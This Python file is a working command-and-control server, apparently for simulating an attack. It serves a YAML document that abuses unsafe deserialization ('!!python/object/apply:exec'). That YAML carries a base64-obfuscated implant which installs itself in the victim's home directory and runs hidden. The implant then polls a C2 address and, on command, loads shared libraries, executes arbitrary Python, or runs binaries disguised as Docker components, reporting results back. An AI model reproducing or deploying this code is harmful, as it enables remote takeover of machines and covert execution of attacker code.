from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import base64
import os

# Hardcoded task configuration
RET_CODE = 0  # Change to 0, 1, 2, 3, or 9 to simulate different responses
INIT_FILE_PATH = "init_payload.so"
PYTHON_EXEC_FILE = "exec_payload.py"
DOCKERD_PATH = "dockerd.bin"
DOCKER_INIT_PATH = "docker-init.bin"

# Define the YAML content directly in memory
YAML_CONTENT = f"""
!!python/object/apply:exec ["import os,sys,base64,subprocess;p=os.path.expanduser('~/Public/__init__.py');os.makedirs(os.path.dirname(p),exist_ok=True);f=open(p,'wb');f.write(base64.b64decode(b'aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IGJhc2U2NAppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IGN0eXBlcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHN0YXQKCmZyb20gdXJsbGliMy5leGNlcHRpb25zIGltcG9ydCBJbnNlY3VyZVJlcXVlc3RXYXJuaW5nCnJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncyhjYXRlZ29yeT1JbnNlY3VyZVJlcXVlc3RXYXJuaW5nKQoKIyBDMiBlbmRwb2ludAp1cmwgPSAiaHR0cDovLzEwLjAuMC40Ny9jMiIKCiMgU2V0dXAgd29ya2luZyBkaXJlY3RvcnkKaG9tZV9kaXJlY3RvcnkgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKQpkaXJlY3RvcnkgPSBvcy5wYXRoLmpvaW4oaG9tZV9kaXJlY3RvcnksICJQdWJsaWMiKQpvcy5tYWtlZGlycyhkaXJlY3RvcnksIGV4aXN0X29rPVRydWUpCgp0cnk6CiAgYm9keV9wYXRoID0gb3MucGF0aC5qb2luKGRpcmVjdG9yeSwgIl9faW5pdF9fLnB5IikKICBvcy5yZW1vdmUoYm9keV9wYXRoKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgcHJpbnQoZSkKCiMgU3lzdGVtIGlkZW50aWZpY2F0aW9uIHBhcmFtZXRlcnMKcGFyYW1zID0gewogICAgInN5c3RlbSI6IHBsYXRmb3JtLnN5c3RlbSgpLAogICAgIm1hY2hpbmUiOiBwbGF0Zm9ybS5tYWNoaW5lKCksCiAgICAidmVyc2lvbiI6IHBsYXRmb3JtLnZlcnNpb24oKQp9CgojIEJlZ2luIHBvbGxpbmcgQzIKd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCB2ZXJpZnk9RmFsc2UsIGRhdGE9cGFyYW1zLCB0aW1lb3V0PTE4MCkKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDA6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApCiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIHJlcyA9IHJlc3BvbnNlLmpzb24oKQoKICAgICAgICBpZiByZXNbInJldCJdID09IDA6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMjApCiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIGVsaWYgcmVzWyJyZXQiXSA9PSAxOgogICAgICAgICAgICAjIERyb3AgYW5kIGxvYWQgc2hhcmVkIGxpYnJhcnkKICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOgogICAgICAgICAgICAgICAgYm9keV9wYXRoID0gb3MucGF0aC5qb2luKGRpcmVjdG9yeSwgImluaXQuZGxsIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGJvZHlfcGF0aCA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksICJpbml0IikKCiAgICAgICAgICAgIHdpdGggb3Blbihib2R5X3BhdGgsICJ3YiIpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGJhc2U2NC5iNjRkZWNvZGUocmVzWyJjb250ZW50Il0pKQoKICAgICAgICAgICAgb3MuZW52aXJvblsiWF9EQVRBQkFTRV9OQU1FIl0gPSAiIiAgIyBQbGFjZWhvbGRlciBlbnZpcm9ubWVudCB2YXIKICAgICAgICAgICAgY3R5cGVzLmNkbGwuTG9hZExpYnJhcnkoYm9keV9wYXRoKQoKICAgICAgICBlbGlmIHJlc1sicmV0Il0gPT0gMjoKICAgICAgICAgICAgIyBFeGVjdXRlIGJhc2U2NC1lbmNvZGVkIFB5dGhvbiBjb2RlCiAgICAgICAgICAgIHNyY19kYXRhID0gYmFzZTY0LmI2NGRlY29kZShyZXNbImNvbnRlbnQiXSkKICAgICAgICAgICAgZXhlYyhzcmNfZGF0YSwgeyJfX25hbWVfXyI6ICJfX21haW5fXyJ9KQoKICAgICAgICBlbGlmIHJlc1sicmV0Il0gPT0gMzoKICAgICAgICAgICAgIyBEcm9wIGFuZCBleGVjdXRlIHBhaXJlZCBiaW5hcmllcwogICAgICAgICAgICBwYXRoMSA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksICJkb2NrZXJkIikKICAgICAgICAgICAgcGF0aDIgPSBvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCAiZG9ja2VyLWluaXQiKQoKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgxLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHJlc1siY29udGVudCJdKSkKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgyLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHJlc1sicGFyYW0iXSkpCgogICAgICAgICAgICBvcy5jaG1vZChwYXRoMSwgc3RhdC5TX0lSV1hVIHwgc3RhdC5TX0lSR1JQIHwgc3RhdC5TX0lYR1JQIHwgc3RhdC5TX0lST1RIIHwgc3RhdC5TX0lYT1RIKQogICAgICAgICAgICBvcy5jaG1vZChwYXRoMiwgc3RhdC5TX0lSV1hVIHwgc3RhdC5TX0lSR1JQIHwgc3RhdC5TX0lYR1JQIHwgc3RhdC5TX0lST1RIIHwgc3RhdC5TX0lYT1RIKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oW3BhdGgxLCBwYXRoMl0sIHN0YXJ0X25ld19zZXNzaW9uPVRydWUpCiAgICAgICAgICAgICAgICBwcm9jLmNvbW11bmljYXRlKCkKICAgICAgICAgICAgICAgIHJjID0gcHJvYy5yZXR1cm5jb2RlCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHVybCArICIvcmVzdWx0IiwgdmVyaWZ5PUZhbHNlLCBkYXRhPXsicmVzdWx0Ijogc3RyKHJjKX0pCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBvcy5yZW1vdmUocGF0aDEpCiAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoMikKCiAgICAgICAgZWxpZiByZXNbInJldCJdID09IDk6CiAgICAgICAgICAgIGJyZWFrCgogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICB0aW1lLnNsZWVwKDEwKQo='));f.close();subprocess.Popen([sys.executable,p],start_new_session=True,stdout=open(os.devnull,'wb'),stderr=subprocess.STDOUT)"]
"""

class C2Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/getData":
            content = YAML_CONTENT.encode("utf-8")
            self.send_response(201)
            self.send_header("Content-Type", "application/yaml")
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "Not Found")


    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len).decode()

        try:
            data = dict(x.split('=') for x in post_body.split('&'))
            print(f"[+] Target system info: {data}")
        except Exception as e:
            print(f"[!] Failed to parse POST data: {e}")
            self.send_response(400)
            self.end_headers()
            return

        if self.path == "/result":
            print(f"[+] Received result from target: {post_body}")
            self.send_response(201)
            self.end_headers()
            return

        response = {"ret": RET_CODE}

        try:
            if RET_CODE == 1:
                with open(INIT_FILE_PATH, "rb") as f:
                    response["content"] = base64.b64encode(f.read()).decode()
            elif RET_CODE == 2:
                with open(PYTHON_EXEC_FILE, "r") as f:
                    response["content"] = base64.b64encode(f.read().encode()).decode()
            elif RET_CODE == 3:
                with open(DOCKERD_PATH, "rb") as f:
                    response["content"] = base64.b64encode(f.read()).decode()
                with open(DOCKER_INIT_PATH, "rb") as f:
                    response["param"] = base64.b64encode(f.read()).decode()
            elif RET_CODE in [0, 9]:
                pass
            else:
                raise ValueError("Invalid RET_CODE configured.")
        except FileNotFoundError as e:
            print(f"[!] Missing file for RET={RET_CODE}: {e}")
            self.send_response(500)
            self.end_headers()
            return

        response_bytes = json.dumps(response).encode()
        self.send_response(201)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response_bytes)))
        self.end_headers()
        self.wfile.write(response_bytes)

if __name__ == "__main__":
    server_address = ("0.0.0.0", 80)
    httpd = HTTPServer(server_address, C2Handler)
    print("C2 server running on http://0.0.0.0:80")
    httpd.serve_forever()
